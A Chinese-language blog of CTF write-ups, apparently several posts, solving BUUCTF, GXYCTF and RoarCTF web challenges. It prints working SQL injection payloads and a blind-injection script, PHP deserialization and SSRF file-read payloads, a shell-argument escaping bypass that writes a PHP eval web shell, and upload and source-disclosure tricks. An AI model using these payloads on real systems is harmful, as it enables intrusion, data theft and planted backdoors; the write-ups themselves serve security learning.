<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>MD5的考点，第一个是弱等于，所以只要找MD5值为0e开头的就行，接下来是强等于，强等于直接让值为数组类型，因为MD5转化数组直接为0</p>
<h2 id="NiZhuanSiWei"><a href="#NiZhuanSiWei" class="headerlink" title="NiZhuanSiWei"></a>NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>file_get_contents()函数，从文件中获取内容，这里使用data://伪协议进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.?file&#x3D;data:text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;  #后面的base64字符是需要传入的字符串的base64编码</span><br></pre></td></tr></table></figure>

<p>接下来是file，由于这里使用正则替换了flag所以往下看， 有个反序列化，结合源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时就很明了了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210319191819.png" alt="img" style="zoom:67%;"><br>这里还提示了useless.php，思路就是这里包含了useless.php后，反序列化进入useless.php中就可以输出flag了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FLag();</span><br><span class="line">$a=serialize($a);</span><br><span class="line"><span class="keyword">print</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上是生成反序列化内容的代码，一开始一直在想如何在类外给file赋值，后来查不到（可能姿势不对）然后phpstorm正好有赋值功能，所以就直接赋值了，然后想了一下，直接对类里面进行赋值其实就可以了，得到以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>然后拼接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>以上为payload</p>
<h2 id="hack-world"><a href="#hack-world" class="headerlink" title="hack world"></a>hack world</h2><p>看到过滤了这么多，八成就是盲注，fuzz了一下，发现and被过滤了，subustr没有被过滤，select也没有，因为and被过滤了，所以这里就需要一些运算连接符，比如说以前的-0- 但是这里-号被过滤了，看了一下 发现^异或符没被过滤，测试了一下发现可以<br>直接写脚本:flag{ed3c991a99f9480e8595a410ad4e6175}</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=r<span class="string">&quot;http://d9e1077c-0511-4ac8-b837-47a768476f3b.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line">pay_try=<span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j in pay_try:</span><br><span class="line">        payload=f<span class="string">&quot;1^((substr((select(flag)from(flag)),&#123;i&#125;,1))=&#x27;&#123;j&#125;&#x27;)^1&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        <span class="keyword">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> in s.post(url=url,data=data).text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这个异或在这里还是一个运算符:</p>
<h2 id="Hard-SQL"><a href="#Hard-SQL" class="headerlink" title="Hard SQL"></a>Hard SQL</h2><p>和上一题一样，但是这里是用异或作为运算符来连接，用括号绕过空格过滤<br>因为这种方法利用了异或符号，所以给它取名为xor注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(&#39;~&#39;,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))#</span><br></pre></td></tr></table></figure>

<p>接下来还是一样 不过是要用substr去截一下，但是这里substr被过滤了，fuzz一下，发现right之类的指令没被过滤:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(&#39;~&#39;,(select(mid(password,30))from((H4rDsq1)))))#</span><br></pre></td></tr></table></figure>

<h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><p>注册——登录——url上存在数字型注入:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=<span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_name=%<span class="number">27</span>users%<span class="number">27</span>)))%<span class="number">20</span>--+</span><br></pre></td></tr></table></figure>

<p>但是报错注入啥东西也没注入出来？所以可能考点不在这，于是扫描一下目录看看:发现robots.txt<br>里面有个user.php.bak 下载打开看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计上述代码 发现可疑的curl_exec()函数：</p>
<h4 id="利用curl读取写入文件"><a href="#利用curl读取写入文件" class="headerlink" title="利用curl读取写入文件"></a>利用curl读取写入文件</h4><p><strong>Linux系统中一般都会自带curl工具，其次是curl支持file协议，意味着我们能够读取本地文件。</strong></p>
<p>这边使用的file协议进行读取<br>这题没我有想象得那么简单：<br>这里从头开始捋一下思路重做一下:<br>当我进行报错注入的时候<br>得到:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 以上字段名</span><br></pre></td></tr></table></figure>

<p>当我们获取data字段名的时候发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:9:&quot;ad1sa.asd&quot;;&#125; </span><br></pre></td></tr></table></figure>

<p>结合前面的curl函数漏洞，我们知道如果可以在blog一栏输入我们的file://语句，那么就会被curl_exec解析执行命令，但是该如何注入呢？再次尝试union联合注入，使用/**/进行绕过，发现是可以的，order by验证字段数——注入。<br>这里就直接放payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span> <span class="keyword">from</span> users --+</span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这道题没我想象得那么容易，其中还有ssrf漏洞的相关知识结合sql注入还有简单序列化问题<br>打算去整理一篇ssrf的文章。</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf5</title>
    <url>/2021/03/30/buuctf5/</url>
    <content><![CDATA[<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>真正有用的是从下面get开始，我们可以看到两个不同寻常的函数:<a id="more"></a></p>
<h4 id="escapeshellcmd和escapeshellarg"><a href="#escapeshellcmd和escapeshellarg" class="headerlink" title="escapeshellcmd和escapeshellarg"></a>escapeshellcmd和escapeshellarg</h4><p>看看有什么特性吧:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line"></span><br><span class="line">反斜线（\）会在以下字符之前插入： &amp;#;&#96;|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 &#39; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</span><br></pre></td></tr></table></figure>

<ol>
<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li>
</ol>
<p>参考:<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<p><strong>总的来说就是两个连用会造成单引号逃逸</strong></p>
<p>回到本题中:<br>这里最后执行了system，不过是nmap的命令<br>这里查看一下nmap都有什么常用指令可以利用的</p>
<h4 id="nmap输出选项"><a href="#nmap输出选项" class="headerlink" title="nmap输出选项"></a>nmap输出选项</h4><p>似乎有个任意文件写入:<br>Nmap可以把扫描结果保存为外部文件。在需要使用其他工具处理Nmap的扫描结果时，这一 功能十分有用。即使您设定程序把扫描结果保存为文件，Nmap还是会在屏幕上显示扫描结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -oG <span class="number">1.</span>php <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>经测试可以这样写</p>
<h4 id="结合测试"><a href="#结合测试" class="headerlink" title="结合测试"></a>结合测试</h4><p>测试一下如何添加单引号可以避免转义并且引入进行命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;-oG 1.php &lt;?php @eval($_POST[1]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解析一下：需要加两个单引号的原因是，如果不加单引号，代入到system中的执行就为<code>&#39;-oG 1.php &lt;?php @eval($_POST[1]);?&gt;&#39;</code>此时这一整段内容是被当做字符串的，我们需要让他逃逸出来,所以此时就用到了上述漏洞的特性</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210330214351.png" alt="img" style="zoom:67%;">

<p>分析一下 此时前面两个引号闭合 中间一个\ 后面的引号再次闭合 最后四个引号也分别闭合:</p>
<p>发送以后会有文件夹的回显，进去用蚁剑连接即可：我从蚁剑里面查看了一下最终内容:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.70 scan initiated Tue Mar 30 13:10:07 2021 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG 1.php \ &lt;?php @eval($_POST[1]);?&gt;\\</span></span><br><span class="line"><span class="comment"># Nmap done at Tue Mar 30 13:10:09 2021 -- 0 IP addresses (0 hosts up) scanned in 2.57 seconds</span></span><br><span class="line"><span class="comment">//可以发现一句话木马完好无损</span></span><br></pre></td></tr></table></figure>

<p>我看别人的payload，一句话木马是放在前面的，但是我测试放在后面也可以，如果放在前面 还需要注意最后的’和前面的php是有一个空格因为1.php//是不会被认为是一个php文件的</p>
<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>前言:有关java的题目是时候学一下了<br>看到登录框认为是sql注入，但是尝试了一下，发现好像没那意思，于是回想一下前几次的java题目，好像都会给源码，于是点了一下help，发现有文件下载漏洞？尝试了一下发现啥也不行，于是看了一下wp:<br>原来这题需要用<strong>post来发送数据，这里又为我们提供了一种思路，当get无反应时，不妨试试post，不够回想了一下，之前就有遇到过的样子，所以希望自己能记住吧</strong><br>想起来之前整理的常见源码泄露：</p>
<h3 id="web-inf源码泄露"><a href="#web-inf源码泄露" class="headerlink" title="web-inf源码泄露"></a>web-inf源码泄露</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line"></span><br><span class="line">WEB-INF 主要包含一下文件或目录：</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">WEB-INF&#x2F;web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF&#x2F;database.properties : 数据库配置文件</span><br><span class="line">WEB-INF&#x2F;classes&#x2F; : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF&#x2F;lib&#x2F; : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF&#x2F;src&#x2F; : 用来放源代码(.asp和.php等)</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。</span><br></pre></td></tr></table></figure>

<p>果然可以下载第一个目录下的文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210330221358.png" alt="img"></p>
<p><strong>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。</strong><br>没看懂这个如何利用，于是查了一下:<br>当攻击者通过传入恶意的<code>name</code>参数值为<code>WEB-INF/web.xml</code>时可以读取Web应用的配置信息,而这里正好放了挺多class文件名，而这些class文件正好存在在WEB-INF/classes/这个当中，于是我们看上面的内容,不难构造:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br><span class="line">#这边的.就是我们的/吧 然后最后我们要的FlagController  java类文件加个后缀.class即可读出</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>上传.htaccess<br>MIME绕过<br>在改后缀就行，我还加了个gif98a</p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git文件泄露，扫描可得:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？ &lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;<span class="comment">//这里说明只允许无参数的内容输入进来</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="php函数嵌套"><a href="#php函数嵌套" class="headerlink" title="php函数嵌套"></a>php函数嵌套</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scandir()   列出 images 目录中的文件和目录，scandir(.)</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">readfile()  输出一个文件</span><br><span class="line">implode()   把数组元素组合为字符串</span><br><span class="line">current(localeconv()) 返回一个.</span><br><span class="line">next() 返回第二个元素的值</span><br><span class="line">array_rand() 从数组中随机取出一个或多个单元</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .. .git flag.php index.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?exp=<span class="keyword">echo</span>(implode(scandir(chr(pos(localtime(time())))))); </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?exp=<span class="keyword">echo</span>(implode(scandir(chr(pos(localtime(time()))))));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?exp=var_dump(file(next(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>

<p>解析:<br>第一个判断让我们无法使用为协议，第二个判断让我们无法传入动态变量，第三个判断过滤一些系统命令，所以此时只能使用函数嵌套的方式进行解题，一开始构造的时候参考了一下大佬们的paylaod，用的是时间戳的函数，卡在二十多秒刚好有一个点，可以进行读取，后来发现使用current(localeconv())更好用，果然我就是个菜鸟，然后在想读取文件的时候，由于是在倒数第二个，比较难办，一开始想的是直接删除index.php文件就可，后来想想自己也太暴力，这个环境的运行就是依托这个文件的，于是就作罢了，然后再去查阅了一下资料，发现了一个翻转函数，这样就可以实现flag.php文件的读取了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210401161310.png" alt="img" style="zoom:67%;"></p>
]]></content>
  </entry>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2021/02/06/getshell/</url>
    <content><![CDATA[<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120229.png" alt="img" style="zoom:67%;">
打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容                                                                                     <a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@<span class="keyword">eval</span>($_POST[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解密网址如下:<a href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a><br>看起来是个一句话木马，用蚁剑连接试试:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120640.png" alt="img" style="zoom:67%;"><br>接下来我想访问一下其他文件夹试试，发现是没有权限的，这个时候就要想想如何提权了？</p>
<p>打开命令执行窗口，发现不论输入什么指令都是ret<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207130155.png" alt="img" style="zoom:67%;"><br>搜索一下这个ret=127什么意思,发现是绕过disable_functions</p>
<p>接下来就直接去百度如果bypass_disable_functions这里介绍说可以直接用antsword里面的插件</p>
